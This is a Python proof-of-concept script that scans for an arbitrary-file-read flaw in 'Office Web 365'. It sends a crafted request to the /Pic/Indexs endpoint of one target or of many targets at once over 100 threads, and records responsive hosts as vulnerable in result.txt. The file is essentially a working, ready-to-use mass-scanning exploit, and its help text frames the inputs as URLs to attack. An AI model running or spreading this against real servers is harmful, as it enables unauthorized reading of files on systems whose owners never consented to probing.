import requests,argparse,re,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()
    perser = argparse.ArgumentParser(description="office web 365 any file read")
    perser.add_argument('-u','--url',help="Please input the url you want to attack")
    perser.add_argument('-f','--file',help="Please input the file you want to attack")
    args = perser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    url = target + "/Pic/Indexs?imgs=DJwkiEm6KXJZ7aEiGyN4Cz83Kn1PLaKA09"
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121'
    }
    try:
        response = requests.get(url=url,headers=headers,verify=False,timeout=5).text
        if 'Mail' in response:
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(f"[+]{target} is vulnerabilities present"+"\n")
            print(f"[+]{target} is vulnerabilities present")
        else:
            print(f"[-]{target} is not vulnerabilities present")
    except:
        print(f"[*]{target} is server error")
def banner():
    test = """

      ·▄▄▄·▄▄▄▪   ▄▄· ▄▄▄ .    ▄▄▌ ▐ ▄▌▄▄▄ .▄▄▄▄·          ▄▄▄·  ▐ ▄  ▄· ▄▌    ·▄▄▄▪  ▄▄▌  ▄▄▄ .    ▄▄▄  ▄▄▄ . ▄▄▄· ·▄▄▄▄  
▪     ▐▄▄·▐▄▄·██ ▐█ ▌▪▀▄.▀·    ██· █▌▐█▀▄.▀·▐█ ▀█▪        ▐█ ▀█ •█▌▐█▐█▪██▌    ▐▄▄·██ ██•  ▀▄.▀·    ▀▄ █·▀▄.▀·▐█ ▀█ ██▪ ██ 
 ▄█▀▄ ██▪ ██▪ ▐█·██ ▄▄▐▀▀▪▄    ██▪▐█▐▐▌▐▀▀▪▄▐█▀▀█▄        ▄█▀▀█ ▐█▐▐▌▐█▌▐█▪    ██▪ ▐█·██▪  ▐▀▀▪▄    ▐▀▀▄ ▐▀▀▪▄▄█▀▀█ ▐█· ▐█▌
▐█▌.▐▌██▌.██▌.▐█▌▐███▌▐█▄▄▌    ▐█▌██▐█▌▐█▄▄▌██▄▪▐█        ▐█ ▪▐▌██▐█▌ ▐█▀·.    ██▌.▐█▌▐█▌▐▌▐█▄▄▌    ▐█•█▌▐█▄▄▌▐█ ▪▐▌██. ██ 
 ▀█▄▀▪▀▀▀ ▀▀▀ ▀▀▀·▀▀▀  ▀▀▀      ▀▀▀▀ ▀▪ ▀▀▀ ·▀▀▀▀          ▀  ▀ ▀▀ █▪  ▀ •     ▀▀▀ ▀▀▀.▀▀▀  ▀▀▀     .▀  ▀ ▀▀▀  ▀  ▀ ▀▀▀▀▀• 

"""
    print(test)

if __name__ == '__main__':
    main()